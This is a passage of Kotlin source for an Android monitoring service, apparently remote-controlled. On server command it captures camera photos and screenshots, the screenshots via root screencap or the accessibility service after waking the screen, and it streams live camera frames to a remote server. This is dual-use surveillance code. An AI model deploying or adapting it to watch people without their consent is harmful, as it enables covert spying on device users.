                        val requestBody = MultipartBody.Builder()
                            .setType(MultipartBody.FORM)
                            .addFormDataPart("deviceId", deviceId)
                            .addFormDataPart(
                                "photo",
                                filename,
                                optimized.toRequestBody("image/jpeg".toMediaTypeOrNull())
                            )
                            .build()

                        val request = Request.Builder()
                            .url("$serverHttpBaseUrl/api/upload-photo")
                            .post(requestBody)
                            .addHeader("X-Filename", filename)
                            .addHeader("X-Device-Id", deviceId)
                            .build()

                        val response = photoUploadClient.newCall(request).execute()
                        httpSuccess = response.isSuccessful
                        response.close()
                    } catch (e: Exception) {
                        Log.e(TAG, "HTTP photo upload failed: ${e.message}")
                    }

                    if (!httpSuccess) {
                        Log.w(TAG, "Falling back to WebSocket binary for photo")
                        val msgJson = JSONObject().apply {
                            put("type", "photo_upload")
                            put("deviceId", deviceId)
                            put("camera", cameraName)
                            put("quality", photoQualityMode)
                            put("nightMode", photoNightMode)
                            put("filename", filename)
                            put("mime", "image/jpeg")
                            put("aiEnhanced", aiPhotoEnhancementEnabled)
                            put("lowNetwork", lowNetworkMode)
                            put("ts", System.currentTimeMillis())
                        }.toString()
                        val headerBytes = msgJson.toByteArray(Charsets.UTF_8)
                        val headerLen = headerBytes.size
                        
                        val out = ByteArray(4 + headerLen + optimized.size)
                        out[0] = 0x43 // 'C'
                        out[1] = 0x4C // 'L'
                        out[2] = ((headerLen shr 8) and 0xFF).toByte()
                        out[3] = (headerLen and 0xFF).toByte()
                        System.arraycopy(headerBytes, 0, out, 4, headerLen)
                        System.arraycopy(optimized, 0, out, 4 + headerLen, optimized.size)
                        safeSend(okio.ByteString.of(*out))
                    }
                    sendCommandAck("take_photo", "success", cameraName)
                } ?: run {
                    Log.e(TAG, "Photo capture timeout")
                    sendCommandAck("take_photo", "error", "timeout")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Photo capture failed: ${e.message}", e)
                sendCommandAck("take_photo", "error", e.message?.take(50))
            } finally {
                // BUG-R1/R13: single cleanup point — always release the guard here
                photoCaptureBusyGuard.set(false)
                if (wasLive) {
                    startCameraLiveStream(cameraLiveFacing, cameraLiveStrictFacing)
                }
            }
        }
    }

    @SuppressLint("ObsoleteSdkInt")
    private fun captureAndSendScreenshot() {
        serviceScope.launch(Dispatchers.IO) {
            var tempWakeLock: PowerManager.WakeLock? = null
            try {
                val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                if (!pm.isInteractive) {
                    @Suppress("DEPRECATION")
                    val flags = PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP
                    tempWakeLock = pm.newWakeLock(flags, "Monitor:ScreenshotWake")
                    tempWakeLock.acquire(3000L) // Auto release after 3s
                    delay(800L) // Give display time to wake up and draw the lock screen
                }
            } catch (e: Exception) {
                Log.w(TAG, "Failed to wake screen: ${e.message}")
            }

            try {
                // Try rooted approach first
                val rootScreenshot = withTimeoutOrNull(10000L) {
                    var process: Process? = null
                    try {
                        process = Runtime.getRuntime().exec(arrayOf("su", "-c", "screencap -p"))
                        val bytes = process.inputStream.readBytes()
                        process.waitFor()
                        if (process.exitValue() == 0 && bytes.isNotEmpty()) bytes else null
                    } catch (e: Exception) {
                        Log.w(TAG, "Root screenshot exception: ${e.message}")
                        null
                    } finally {
                        try {
                            process?.destroy()
                        } catch (e: Exception) {
                            Log.w(TAG, "Failed to destroy su process: ${e.message}")
                        }
                    }
                }

                if (rootScreenshot != null) {
                    uploadScreenshotBytes(rootScreenshot)
                    return@launch
                }
            } catch (e: Exception) {
                Log.w(TAG, "Root screenshot failed: ${e.message}")
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                val accessibilityInstance = MonitorAccessibilityService.instance
                if (accessibilityInstance != null) {
                    accessibilityInstance.captureScreen { bitmap ->
                        if (bitmap != null) {
                            serviceScope.launch(Dispatchers.IO) {
                                val stream = java.io.ByteArrayOutputStream()
                                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream)
                                val jpegBytes = stream.toByteArray()
                                bitmap.recycle()
                                uploadScreenshotBytes(jpegBytes)
                            }
                        } else {
                            sendCommandAck("take_screenshot", "error", "capture_failed")
                        }
                    }
                } else {
                    sendCommandAck("take_screenshot", "error", "accessibility_service_not_running")
                }
            } else {
                sendCommandAck("take_screenshot", "error", "unsupported_android_version")
            }
        }
    }

    private fun uploadScreenshotBytes(jpegBytes: ByteArray) {
        val filename = "screenshot_${deviceId}_${System.currentTimeMillis()}.jpg"
        var httpSuccess = false
        try {
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("deviceId", deviceId)
                .addFormDataPart(
                    "photo",
                    filename,
                    jpegBytes.toRequestBody("image/jpeg".toMediaTypeOrNull())
                )
                .build()

            val request = Request.Builder()
                .url("$serverHttpBaseUrl/api/upload-photo")
                .post(requestBody)
                .addHeader("X-Filename", filename)
                .addHeader("X-Device-Id", deviceId)
                .build()

            val response = photoUploadClient.newCall(request).execute()
            httpSuccess = response.isSuccessful
            response.close()
        } catch (e: Exception) {
            Log.e(TAG, "HTTP screenshot upload failed: ${e.message}")
        }

        if (!httpSuccess) {
            Log.w(TAG, "Falling back to WebSocket binary for screenshot")
            val msgJson = JSONObject().apply {
                put("type", "screenshot_upload")
                put("deviceId", deviceId)
                put("filename", filename)
                put("mime", "image/jpeg")
                put("ts", System.currentTimeMillis())
            }.toString()
            val headerBytes = msgJson.toByteArray(Charsets.UTF_8)
            val headerLen = headerBytes.size

            val out = ByteArray(4 + headerLen + jpegBytes.size)
            out[0] = 0x43 // 'C'
            out[1] = 0x4C // 'L'
            out[2] = ((headerLen shr 8) and 0xFF).toByte()
            out[3] = (headerLen and 0xFF).toByte()
            System.arraycopy(headerBytes, 0, out, 4, headerLen)
            System.arraycopy(jpegBytes, 0, out, 4 + headerLen, jpegBytes.size)
            safeSend(okio.ByteString.of(*out))
        }
        sendCommandAck("take_screenshot", "success")
    }

    private fun parseRequestedCameraFacing(cameraMode: String): Int? {
        return when (cameraMode.trim().lowercase()) {
            "front", "front_camera", "front-camera", "frontcam", "selfie" -> CameraCharacteristics.LENS_FACING_FRONT
            "rear", "back", "rear_camera", "rear-camera", "back_camera", "back-camera", "backcam", "main" -> CameraCharacteristics.LENS_FACING_BACK
            else -> null
        }
    }

    private data class PhotoCaptureProfile(
        val exposureNs: Long?,
        val iso: Int?,
        val torch: Boolean,
        val aeCompensation: Int,
    )

    private fun requestedNightExposureNs(): Long? {
        return when (photoNightMode) {
            "1s" -> 100_000_000L // 100ms
            "3s" -> 200_000_000L // 200ms
            "5s" -> 350_000_000L // 350ms
            else -> null
        }
    }

    private fun buildPhotoCaptureProfile(chars: CameraCharacteristics): PhotoCaptureProfile {
        val requestedExposure = requestedNightExposureNs() ?: return PhotoCaptureProfile(
            exposureNs = null,
            iso = null,
            torch = false,
            aeCompensation = 0,
        )

        val caps = chars.get(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES) ?: IntArray(0)
        val manualSensor = caps.contains(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES_MANUAL_SENSOR)
        val expRange = chars.get(CameraCharacteristics.SENSOR_INFO_EXPOSURE_TIME_RANGE)
        val isoRange = chars.get(CameraCharacteristics.SENSOR_INFO_SENSITIVITY_RANGE)
        if (manualSensor && expRange != null && isoRange != null) {
            val clampedExposure = requestedExposure.coerceIn(expRange.lower, expRange.upper)
            val desiredIso = when (photoNightMode) {
                "1s" -> 1600
                "3s" -> 3200
                "5s" -> 6400
                else -> 800
            }
            val clampedIso = desiredIso.coerceIn(isoRange.lower, isoRange.upper)
            return PhotoCaptureProfile(
                exposureNs = clampedExposure,
                iso = clampedIso,
                torch = false,
                aeCompensation = 0,
            )
        }

        val aeRange = chars.get(CameraCharacteristics.CONTROL_AE_COMPENSATION_RANGE)
        val maxComp = aeRange?.upper ?: 0
        val flashAvail = chars.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
        val aeComp = if (maxComp > 0) {
            // Torch already raises scene illumination; avoid torch + max EV double-exposure.
            if (flashAvail) 0 else (maxComp / 2).coerceAtLeast(1)
        } else {
            0
        }
        return PhotoCaptureProfile(
            exposureNs = null,
            iso = null,
            torch = flashAvail,
            aeCompensation = aeComp,
        )
    }

    @SuppressLint("MissingPermission")
    private suspend fun captureJpegOnce(targetFacing: Int, allowFacingFallback: Boolean = true): Pair<ByteArray, Int>? {
        val cm = getSystemService(CameraManager::class.java) ?: return null
        val cameraId = selectCameraId(cm, targetFacing, allowFacingFallback) ?: return null
        val chars = cm.getCameraCharacteristics(cameraId)
        val actualFacing = chars.get(CameraCharacteristics.LENS_FACING) ?: targetFacing
        val captureProfile = buildPhotoCaptureProfile(chars)
        val streamMap = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return null
        
        // Resolution settings based on quality mode
        // HD mode: use max resolution for full quality
        // Normal/Fast: reasonable size that still captures full frame
        val maxEdge = when (photoQualityMode) {
            "fast" -> 1280   // Reduced for size
            "hd" -> 4096     // Full 4K / 8MP+ detail
            else -> 2560     // Balanced
        }
        
        val allSizes = streamMap.getOutputSizes(ImageFormat.JPEG) ?: return null
        
        // Get sensor aspect ratio for full-frame capture (no crop)
        val sensorSize = chars.get(CameraCharacteristics.SENSOR_INFO_ACTIVE_ARRAY_SIZE)
        val sensorRatio = if (sensorSize != null && sensorSize.width() > 0 && sensorSize.height() > 0) {
            sensorSize.width().toFloat() / sensorSize.height()
        } else {
            4f / 3f  // Default to 4:3
        }
        
        // Prefer sizes matching sensor ratio (full frame, no crop)
        val size = allSizes
            .filter { it.width <= maxEdge && it.height <= maxEdge }
            .sortedWith(compareBy<android.util.Size> { sz ->
                // Calculate aspect ratio match to sensor (full frame = 0 difference)
                val ratio = maxOf(sz.width, sz.height).toFloat() / minOf(sz.width, sz.height)
                Math.abs(ratio - sensorRatio)
            }.thenByDescending { it.width * it.height })  // Then prefer larger
            .firstOrNull()
            ?: allSizes.maxByOrNull { it.width * it.height }  // Fallback: largest available
            ?: return null
        
        Log.d(TAG, "Photo capture: ${size.width}x${size.height}, sensor ratio: $sensorRatio")

        val thread = HandlerThread("photo_capture_thread").apply { start() }
        val handler = Handler(thread.looper)
        val imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
        val imageResult = CompletableDeferred<Pair<ByteArray, Int>?>()

        var camera: CameraDevice? = null
        var session: CameraCaptureSession? = null
        val cameraClosed = java.util.concurrent.atomic.AtomicBoolean(false)
        val isWarmupComplete = java.util.concurrent.atomic.AtomicBoolean(false)
        val expectedTimestamp = java.util.concurrent.atomic.AtomicLong(-1L)
        val focusDistance = java.util.concurrent.atomic.AtomicReference<Float?>(null)
        val aeConverged = CompletableDeferred<Unit>()
        val afLocked = CompletableDeferred<Unit>()

        val sensorOrientation = chars.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 90
        @Suppress("DEPRECATION")
        val deviceRotation = (getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager)
            .defaultDisplay.rotation
        val deviceRotationDeg = when (deviceRotation) {
            android.view.Surface.ROTATION_0 -> 0
            android.view.Surface.ROTATION_90 -> 90
            android.view.Surface.ROTATION_180 -> 180
            android.view.Surface.ROTATION_270 -> 270
            else -> 0
        }
        val jpegOrientation = if (actualFacing == CameraCharacteristics.LENS_FACING_FRONT) {
            (sensorOrientation + deviceRotationDeg) % 360
        } else {
            (sensorOrientation - deviceRotationDeg + 360) % 360
        }

        try {
            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage()
                if (image != null) {
                    try {
                        val expected = expectedTimestamp.get()
                        if (isWarmupComplete.get() && expected != -1L && image.timestamp >= expected) {
                            val buffer: ByteBuffer = image.planes[0].buffer
                            val arr = ByteArray(buffer.remaining())
                            buffer.get(arr)
                            // Only accept JPEG images with a valid header (FFD8 magic)
                            if (arr.size > 2 && arr[0] == 0xFF.toByte() && arr[1] == 0xD8.toByte()) {
                                if (!imageResult.isCompleted) imageResult.complete(Pair(arr, actualFacing))
                            } else {
                                Log.w(TAG, "Discarding non-JPEG frame (${arr.size} bytes)")
                            }
                        }
                    } catch (_: Exception) {
                        if (!imageResult.isCompleted) imageResult.complete(null)
                    } finally {
                        image.close()
                    }
                }
            }, handler)

            val stageTimeoutMs = when (photoNightMode) {
                "5s" -> 12_000L
                "3s" -> 10_000L
                "1s" -> 9_000L
                else -> 8_000L
            }
            val captureTimeoutMs = when (photoNightMode) {
                "5s" -> 12_000L
                "3s" -> 10_000L
                "1s" -> 9_000L
                else -> 8_000L
            }
            val cameraDevice = withTimeoutOrNull(stageTimeoutMs) {
                suspendCancellableCoroutine<CameraDevice?> { cont ->
                    try {
                        cm.openCamera(cameraId, object : CameraDevice.StateCallback() {
                            override fun onOpened(cd: CameraDevice) { 
                                if (cont.isActive) cont.resumeWith(Result.success(cd)) else if (cameraClosed.compareAndSet(false, true)) cd.close()
                            }
                            override fun onDisconnected(cd: CameraDevice) { 
                                if (cameraClosed.compareAndSet(false, true)) cd.close()
                                if (cont.isActive) cont.resumeWith(Result.success(null))
                            }
                            override fun onError(cd: CameraDevice, error: Int) { 
                                if (cameraClosed.compareAndSet(false, true)) cd.close()
                                if (cont.isActive) cont.resumeWith(Result.success(null))
                            }
                        }, handler)
                    } catch (e: Exception) {
                        if (cont.isActive) cont.resumeWith(Result.success(null))
                    }
                }
            } ?: return null
            camera = cameraDevice

            val captureSession = withTimeoutOrNull(stageTimeoutMs) {
                suspendCancellableCoroutine<CameraCaptureSession?> { cont ->
                    try {
                        cameraDevice.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(cs: CameraCaptureSession) { 
                                if (cont.isActive) cont.resumeWith(Result.success(cs)) else cs.close()
                            }
                            override fun onConfigureFailed(cs: CameraCaptureSession) { 
                                if (cont.isActive) cont.resumeWith(Result.success(null))
                            }
                        }, handler)
                    } catch (e: Exception) {
                        if (cont.isActive) cont.resumeWith(Result.success(null))
                    }
                }
            } ?: return null
            session = captureSession

            val captureCallback = object : CameraCaptureSession.CaptureCallback() {
                override fun onCaptureCompleted(session: CameraCaptureSession, request: CaptureRequest, result: TotalCaptureResult) {
                    focusDistance.set(result.get(CaptureResult.LENS_FOCUS_DISTANCE))

                    val aeState = result.get(CaptureResult.CONTROL_AE_STATE)
                    if (!aeConverged.isCompleted && (
                        aeState == CaptureResult.CONTROL_AE_STATE_CONVERGED ||
                        aeState == CaptureResult.CONTROL_AE_STATE_LOCKED ||
                        aeState == CaptureResult.CONTROL_AE_STATE_FLASH_REQUIRED
                    )) {
                        aeConverged.complete(Unit)
                    }

                    val afState = result.get(CaptureResult.CONTROL_AF_STATE)
                    if (!afLocked.isCompleted && (
                        afState == CaptureResult.CONTROL_AF_STATE_FOCUSED_LOCKED ||
                        afState == CaptureResult.CONTROL_AF_STATE_NOT_FOCUSED_LOCKED
                    )) {
                        afLocked.complete(Unit)
                    }
                }
            }

            // Warmup uses STILL template to keep ISP/AE/AF pipeline consistent with final still.
            val warmupReq = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                addTarget(imageReader.surface)
                set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                set(CaptureRequest.JPEG_ORIENTATION, jpegOrientation)
            }.build()
            captureSession.setRepeatingRequest(warmupReq, captureCallback, handler)
            withTimeoutOrNull(3_000L) { aeConverged.await() }

            // Explicit AF trigger then lock wait (up to 3s) before firing the still.
            val afTriggerReq = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                addTarget(imageReader.surface)
                set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
                set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                set(CaptureRequest.CONTROL_AF_TRIGGER, CaptureRequest.CONTROL_AF_TRIGGER_START)
                set(CaptureRequest.JPEG_ORIENTATION, jpegOrientation)
            }.build()
            captureSession.capture(afTriggerReq, captureCallback, handler)
            withTimeoutOrNull(3_000L) { afLocked.await() }

            val req = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                addTarget(imageReader.surface)
                set(CaptureRequest.CONTROL_AF_TRIGGER, CaptureRequest.CONTROL_AF_TRIGGER_IDLE)

                // Enable face detection for better focus and exposure
                set(
                    CaptureRequest.STATISTICS_FACE_DETECT_MODE,
                    CaptureRequest.STATISTICS_FACE_DETECT_MODE_SIMPLE)

                // Auto white balance for accurate colors
                set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)

                // Disable crop region (full frame)

                if (captureProfile.exposureNs != null && captureProfile.iso != null) {
                    val minFrameDuration = try {
                        streamMap.getOutputMinFrameDuration(ImageFormat.JPEG, size)
                    } catch (_: Exception) {
                        0L
                    }
                    val frameDurationNs = max(captureProfile.exposureNs, if (minFrameDuration > 0L) minFrameDuration else captureProfile.exposureNs)

                    set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_OFF)
                    set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_OFF)
                    set(CaptureRequest.SENSOR_EXPOSURE_TIME, captureProfile.exposureNs)
                    set(CaptureRequest.SENSOR_FRAME_DURATION, frameDurationNs)
                    set(CaptureRequest.SENSOR_SENSITIVITY, captureProfile.iso)
                    set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_OFF)
                    focusDistance.get()?.let { lockedFocus ->
                        set(CaptureRequest.LENS_FOCUS_DISTANCE, lockedFocus)
                    }
                    set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF)
                    // Noise reduction for night shots
                    set(CaptureRequest.NOISE_REDUCTION_MODE, CaptureRequest.NOISE_REDUCTION_MODE_HIGH_QUALITY)
                } else {
                    // Auto mode: let camera decide
                    set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                    set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                    set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                    set(CaptureRequest.CONTROL_AE_EXPOSURE_COMPENSATION, captureProfile.aeCompensation)
                    set(
                        CaptureRequest.FLASH_MODE,
                        if (captureProfile.torch) CaptureRequest.FLASH_MODE_TORCH else CaptureRequest.FLASH_MODE_OFF
                    )
                    // Standard noise reduction
                    set(CaptureRequest.NOISE_REDUCTION_MODE, CaptureRequest.NOISE_REDUCTION_MODE_FAST)
                }
                set(CaptureRequest.JPEG_ORIENTATION, jpegOrientation)

                // High quality JPEG (we compress later with network awareness)
                set(CaptureRequest.JPEG_QUALITY, 95.toByte())
            }.build()
            captureSession.stopRepeating()
            // Flush all residual preview frames from the ImageReader so they don't
            // race with the actual still capture after isWarmupComplete is set.
            captureSession.abortCaptures()
            delay(800L)
            // Drain any images that arrived during the abort window
            var drained = 0
            while (true) {
                val stale = imageReader.acquireNextImage()
                if (stale != null) { stale.close(); drained++ } else break
            }
            if (drained > 0) Log.d(TAG, "Drained $drained residual preview frames before still capture")
            isWarmupComplete.set(true)

            captureSession.capture(req, object : CameraCaptureSession.CaptureCallback() {
                override fun onCaptureStarted(session: CameraCaptureSession, request: CaptureRequest, timestamp: Long, frameNumber: Long) {
                    expectedTimestamp.compareAndSet(-1L, timestamp)
                }
            }, handler)
            return withTimeoutOrNull(captureTimeoutMs) { imageResult.await() }
        } catch (e: Exception) {
            Log.w(TAG, "captureJpegOnce failed: ${e.message}")
            if (!imageResult.isCompleted) imageResult.complete(null)
            return null
        } finally {
            if (!imageResult.isCompleted) imageResult.cancel()
            try { session?.close() } catch (_: Exception) {}
            try { if (cameraClosed.compareAndSet(false, true)) camera?.close() } catch (_: Exception) {}
            try { imageReader.close() } catch (_: Exception) {}
            try { thread.quitSafely() } catch (_: Exception) {}
        }
    }

    private fun selectCameraId(cm: CameraManager, targetFacing: Int, allowFacingFallback: Boolean = true): String? {
        val ids = cm.cameraIdList ?: return null
        // Selection order:
        // 1) facing + logical/backward-compatible + JPEG
        // 2) facing + physical/backward-compatible + JPEG
        // 3) facing + JPEG (relaxed for OEMs with incomplete capability flags)
        // 4) facing any camera (last facing-preserving fallback)
        // 5) any camera only when caller allows facing fallback
        var logicalMatch: String? = null
        var physicalMatch: String? = null
        var facingJpegRelaxed: String? = null
        var facingAny: String? = null
        var anyStrict: String? = null
        var anyFallback: String? = null
        for (id in ids) {
            val c = cm.getCameraCharacteristics(id)
            val facing = c.get(CameraCharacteristics.LENS_FACING)
            val caps = c.get(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES) ?: IntArray(0)
            val streamMap = c.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val hasJpeg = streamMap?.getOutputSizes(ImageFormat.JPEG)?.isNotEmpty() == true
            val isBackwardCompatible = caps.contains(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES_BACKWARD_COMPATIBLE)

            if (allowFacingFallback && anyFallback == null) anyFallback = id

            if (facing == targetFacing && facingAny == null) facingAny = id
            if (facing == targetFacing && hasJpeg && facingJpegRelaxed == null) facingJpegRelaxed = id

            if (hasJpeg && isBackwardCompatible) {
                if (anyStrict == null) anyStrict = id
                if (facing == targetFacing) {
                    if (isLogicalMultiCamera(c)) {
                        if (logicalMatch == null) logicalMatch = id
                    } else if (physicalMatch == null) {
                        physicalMatch = id
                    }
                }
            }
        }
        return logicalMatch
            ?: physicalMatch
            ?: facingJpegRelaxed
            ?: facingAny
            ?: if (allowFacingFallback) (anyStrict ?: anyFallback) else null
    }

    private fun isLogicalMultiCamera(chars: CameraCharacteristics): Boolean {
        val caps = chars.get(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES) ?: IntArray(0)
        return caps.contains(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES_LOGICAL_MULTI_CAMERA)
    }

    private fun liveFrameIntervalMs(): Long {
        // Bug 8: Much slower frame rate on low-network to save bandwidth
        return when {
            lowNetworkMode -> 500L
            photoQualityMode == "fast" -> 150L
            photoQualityMode == "hd" -> 300L
            else -> 200L
        }
    }

    @SuppressLint("MissingPermission")
    private fun startCameraLiveStream(targetFacing: Int, strictFacing: Boolean = false) {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            sendCommandAck("camera_live_start", "error", "camera_permission_denied")
            return
        }
        cameraLiveStrictFacing = strictFacing
        cameraLiveFacing = targetFacing

        val previousCameraJob = cameraLiveJob
        if (!isCameraLiveStreaming && previousCameraJob?.isActive == true) {
            serviceScope.launch(Dispatchers.IO) {
                try {
                    previousCameraJob.join()
                } catch (_: CancellationException) {
                }
                startCameraLiveStream(targetFacing, strictFacing)
            }
            return
        }

        if (isCameraLiveStreaming) {
            restartCameraLiveStream()
            return
        }
        isCameraLiveStreaming = true
        cameraLiveJob = serviceScope.launch(Dispatchers.IO) {
            val cm = getSystemService(CameraManager::class.java)
            if (cm == null) {
                isCameraLiveStreaming = false
                sendCommandAck("camera_live_start", "error", "camera_unavailable")
                return@launch
            }
            val cameraId = selectCameraId(cm, targetFacing, !cameraLiveStrictFacing)
            if (cameraId == null) {
                isCameraLiveStreaming = false
                sendCommandAck("camera_live_start", "error", "camera_unavailable")
                return@launch
            }

            // BUG-R12: Do NOT send started ACK here — we haven't opened the camera yet.
            // ACK is sent later after the capture session is confirmed open.
            val chars = cm.getCameraCharacteristics(cameraId)
            val actualFacing = chars.get(CameraCharacteristics.LENS_FACING) ?: targetFacing
            val cameraName = if (actualFacing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "rear"
            
            val streamMap = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: run {
                isCameraLiveStreaming = false
                sendCommandAck("camera_live_start", "error", "failed")
                return@launch
            }
            val allSizes = streamMap.getOutputSizes(ImageFormat.JPEG) ?: run {
                isCameraLiveStreaming = false
                sendCommandAck("camera_live_start", "error", "failed")
                return@launch
            }
            val maxEdge = when (photoQualityMode) { "fast" -> 640 else -> 1024 }
            val size = allSizes.filter { it.width <= maxEdge && it.height <= maxEdge }
                .maxByOrNull { it.width * it.height } ?: allSizes.minByOrNull { it.width * it.height } ?: run {
                    isCameraLiveStreaming = false
                    sendCommandAck("camera_live_start", "error", "failed")
                    return@launch
                }

            val thread = HandlerThread("live_camera").apply { start() }
            val handler = Handler(thread.looper)
            val imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
            
            var camera: CameraDevice? = null
            var session: CameraCaptureSession? = null
            val cameraClosed = java.util.concurrent.atomic.AtomicBoolean(false)

            try {
                var lastSent = 0L
                imageReader.setOnImageAvailableListener({ reader ->
                    try {
                        val image = reader.acquireLatestImage()
                        if (image != null) {
                            val now = System.currentTimeMillis()
                            if (isCameraLiveStreaming && activeWebSocket != null && now - lastSent >= liveFrameIntervalMs()) {
                                lastSent = now
                                val buffer = image.planes[0].buffer
                                val arr = ByteArray(buffer.remaining())
                                buffer.get(arr)
                                image.close()

                                // Bug 8: Send raw binary WS frames instead of base64 JSON
                                // Binary format: [0x43][0x4C][headerLenHi][headerLenLo][headerJSON][jpegBytes]
                                // This avoids the 33% size inflation of base64 encoding.
                                val cameraName = if (actualFacing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "rear"
                                val headerJson = """{"type":"camera_live_frame","deviceId":"$deviceId","camera":"$cameraName","quality":"$photoQualityMode","mime":"image/jpeg","ts":$now}"""
                                val headerBytes = headerJson.toByteArray(Charsets.UTF_8)
                                val headerLen = headerBytes.size
                                val packet = ByteArray(4 + headerLen + arr.size)
                                packet[0] = 0x43.toByte()  // 'C' marker
                                packet[1] = 0x4C.toByte()  // 'L' marker
                                packet[2] = ((headerLen shr 8) and 0xFF).toByte()
                                packet[3] = (headerLen and 0xFF).toByte()
                                System.arraycopy(headerBytes, 0, packet, 4, headerLen)
                                System.arraycopy(arr, 0, packet, 4 + headerLen, arr.size)
                                if (!safeSend(packet.toByteString())) {
                                    Log.w(TAG, "Camera live send failed - stopping stream")
                                    isCameraLiveStreaming = false
                                }
                            } else {
                                image.close()
                            }
                        }
                    } catch (_: Exception) {}
                }, handler)

                val cam = withTimeoutOrNull(5_000L) {
                    suspendCancellableCoroutine<CameraDevice?> { cont ->
                        try {
                            cm.openCamera(cameraId, object : CameraDevice.StateCallback() {
                                override fun onOpened(cd: CameraDevice) {
                                    if (cont.isActive) cont.resumeWith(Result.success(cd)) else if (cameraClosed.compareAndSet(false, true)) cd.close()
                                }
                                override fun onDisconnected(cd: CameraDevice) {
                                    if (cameraClosed.compareAndSet(false, true)) cd.close()
                                    if (cont.isActive) cont.resumeWith(Result.success(null))
                                }
                                override fun onError(cd: CameraDevice, error: Int) {
                                    if (cameraClosed.compareAndSet(false, true)) cd.close()
                                    if (cont.isActive) cont.resumeWith(Result.success(null))
                                }
                            }, handler)
                        } catch (_: Exception) {
                            if (cont.isActive) cont.resumeWith(Result.success(null))
                        }
                    }
                } ?: return@launch
                camera = cam

                val capSession = withTimeoutOrNull(5_000L) {
                    suspendCancellableCoroutine<CameraCaptureSession?> { cont ->
                        try {
                            cam.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(cs: CameraCaptureSession) {
                                    if (cont.isActive) cont.resumeWith(Result.success(cs)) else cs.close()
                                }

                                override fun onConfigureFailed(cs: CameraCaptureSession) {
                                    if (cont.isActive) cont.resumeWith(Result.success(null))
                                }
                            }, handler)
                        } catch (_: Exception) {
                            if (cont.isActive) cont.resumeWith(Result.success(null))
                        }
                    }
                } ?: return@launch
                session = capSession

                val liveJpegQuality = when (photoQualityMode) {
                    "fast" -> 70
                    "hd" -> 92
                    else -> 82
                }

                val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                    addTarget(imageReader.surface)
                    set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                    set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                
                // C-02: Correct Live Stream JPEG orientation accounting for display rotation
                val sensorOrientation = chars.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 90
                @Suppress("DEPRECATION")
                val deviceRotation = (getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager).defaultDisplay.rotation
                val deviceRotationDeg = when (deviceRotation) {
                    android.view.Surface.ROTATION_0 -> 0
                    android.view.Surface.ROTATION_90 -> 90
                    android.view.Surface.ROTATION_180 -> 180
                    android.view.Surface.ROTATION_270 -> 270
                    else -> 0
                }
                val jpegOrientation = if (actualFacing == CameraCharacteristics.LENS_FACING_FRONT) {
                    (sensorOrientation + deviceRotationDeg) % 360
                } else {
                    (sensorOrientation - deviceRotationDeg + 360) % 360
                }
                set(CaptureRequest.JPEG_ORIENTATION, jpegOrientation)
